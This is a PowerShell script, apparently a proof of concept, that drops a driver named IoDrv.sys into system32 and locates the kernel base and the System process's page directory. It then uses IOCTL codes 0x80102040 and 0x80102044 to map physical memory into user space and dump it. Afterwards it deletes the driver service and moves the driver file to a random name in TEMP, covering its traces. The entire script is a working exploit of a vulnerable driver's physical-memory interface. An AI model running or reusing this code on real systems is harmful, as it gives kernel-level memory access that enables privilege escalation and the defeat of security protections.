Clear-Host
Write-Host

Copy-Item `
    -Path (Join-Path $PSScriptRoot "IoDrv.sys") `
    -Destination "$env:windir\system32\IoDrv.sys" `
    -ErrorAction SilentlyContinue

$VA = Get-KernelBaseAddress
$PA = Resolve-DirectoryTable -VA64 $VA -ProcessID 4

$hDevice = Get-FileHandle -FileName IoDrv

try {

  # ~~~~~~~~~ @
  # Map Case @
  # ~~~~~~~~~ @

  try {
    $SizeToMap  = 0x400
    $InOutPtr   = New-IntPtr -Size 0x20 -TypeSize ([Int64], [Int64]) -Values ($SizeToMap, $PA)
    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102040 -InOutPtr $InOutPtr -InputSize 0x20 -OutputSize 0x20
    
    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
    
    if ($InvokeCall.Success) {
       Write-Host
       $Buffer = [Byte[]]::new($SizeToMap)
       $Handle = [marshal]::ReadIntPtr($InOutPtr, 0x18)
       [Marshal]::Copy($Handle, $Buffer, 0, $SizeToMap)
       $Buffer | Format-HexView -Mode 16x

       Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102044 -InOutPtr $InOutPtr -InputSize 0x20 -OutputSize 0 | Out-Null
    }
  } finally {
      Free-IntPtr $InOutPtr -Method Auto
  }

} finally {
  if ($hDevice) {
      Free-IntPtr $hDevice -Method NtHandle
  }
}

$TempDir   = $env:TEMP
$SourceDir = "$env:windir\System32"

$Binary = @("IoDrv")
$Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    Stop-Service -Name $_ -ea 0
    sc.exe delete $_ | Out-Null
    if (Test-Path $DriverPath) {
	    Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
    }
}